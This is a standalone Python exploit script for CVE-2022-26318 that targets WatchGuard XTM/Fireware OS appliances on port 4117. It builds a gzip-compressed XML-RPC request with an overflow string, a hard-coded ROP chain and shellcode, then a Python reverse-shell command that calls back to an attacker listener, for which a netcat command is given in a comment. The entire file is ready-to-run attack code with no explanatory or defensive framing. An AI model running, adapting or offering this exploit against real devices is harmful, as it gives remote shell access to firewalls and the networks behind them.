#!/usr/bin/python3
# -*- coding: utf-8 -*-

# CVE-2022-26318

import socket
import ssl
import gzip

# Remote WatchGuard XTM or FireWare OS
R_HOST = "192.168.0.1"
# Local host with nc listener: nc -l 8.8.8.8 8888
L_HOST = "192.168.0.2"


def buildPayload(L_HOST):
    python_code = 'import socket;from subprocess import call; from os import dup2;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",8888)); dup2(s.fileno(),0); dup2(s.fileno(),1); dup2(s.fileno(),2);call(["/usr/bin/python","-i"]);'.format(L_HOST).encode()
    shellcode = b'\xe8\x7a\x00\x00\x00\x2f\x74\x6d\x70\x2f\x74\x65\x73\x74\x2e\x70\x79\x00\xba\xf0\x00\x00\x00\x5e\x48\x89\xcf\xb8\x01\x00\x00\x00\x0f\x05\x6a\x00\xe8\x0d\x00\x00\x00\x2f\x74\x6d\x70\x2f\x74\x65\x73\x74\x2e\x70\x79\x00\xe8\x07\x00\x00\x00\x70\x79\x74\x68\x6f\x6e\x00\x48\x89\xcf\xb8\x03\x00\x00\x00\x0f\x05\xe8\x10\x00\x00\x00\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x79\x74\x68\x6f\x6e\x00\xb8\x3b\x00\x00\x00\x48\x8b\x3c\x24\x48\x8d\x74\x24\x08\x31\xd2\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\x5f\xbe\x41\x02\x00\x00\xba\xb6\x01\x00\x00\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc1\xe8\x79\xff\xff\xff'
    padding = b'\x00'*231

    rop = b'\x0e\xd6\x41\x00\x00\x00\x00\x00' # pop    rax; pop    rbx; pop    rbp; ret
    rop += b'\xb2\xd5\x41\x00\x00\x00\x00\x00' # rax
    rop += b'\x00\x00\x00\x00\x00\x00\x00\x00' # rbx
    rop += b'\x00\x00\x00\x00\x00\x00\x00\x00' # rbp
    rop += b'\x7d\x5e\x40\x00\x00\x00\x00\x00' # mov    rbp,rsp; call   rax
    rop += b'\xad\xd2\x41\x00\x00\x00\x00\x00' # lea    rdx,[rbp-0x80]; mov    rsi,rdx; mov    rdi,rcx; call   rax
    rop += b'\x0e\xd6\x41\x00\x00\x00\x00\x00' # pop    rax; pop    rbx; pop    rbp; ret
    rop += b'\xb0\x00\x00\x00\x00\x00\x00\x00' # rax
    rop += b'\x00\x00\x00\x00\x00\x00\x00\x00' # rbx
    rop += b'\x00\x00\x00\x00\x00\x00\x00\x00' # rbp
    rop += b'\x2a\xa9\x40\x00\x00\x00\x00\x00' # add    rax,rdx; jmp    rax

    payload = "<methodCall><methodName>agent.login</methodName><params><param><value><struct><member><value><".encode()
    payload += ("A"*3181).encode()
    payload += "XNA>".encode()
    payload += ("<BBBBXNA>"*2376+"AA").encode()
    payload += padding
    payload += rop
    payload += shellcode
    payload += python_code
    return gzip.compress(payload, 9)

def buildHTTP(L_HOST, R_HOST):
    http_payload = "POST /agent/login HTTP/1.1\r\n"
    http_payload += "Host: {}:4117\r\n".format(R_HOST)
    http_payload += "User-Agent: CVE-2022-26318\r\n"
    http_payload += "Accept-Encoding: gzip, deflate\r\n"
    http_payload += "Accept: */*\r\n"
    http_payload += "Connection: close\r\n"
    http_payload += "Content-Encoding: gzip\r\n"
    gzippedExploit = buildPayload(L_HOST)
    http_payload += "Content-Length: {}\r\n".format(len(gzippedExploit))
    http_payload += "\r\n"
    return http_payload.encode() + gzippedExploit

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    wrappedSocket = ssl.wrap_socket(sock=sock, cert_reqs=ssl.CERT_NONE)
    server_address = (R_HOST, 4117)
    print('connecting to {} port {}'.format(*server_address))
    wrappedSocket.settimeout(3)
    try:
        wrappedSocket.connect(server_address)
        print("sending payload...")
        payload = buildHTTP(L_HOST, R_HOST)
        wrappedSocket.sendall(payload)
    except:
        pass
    finally:
        print('closing socket')
        wrappedSocket.close()

main()
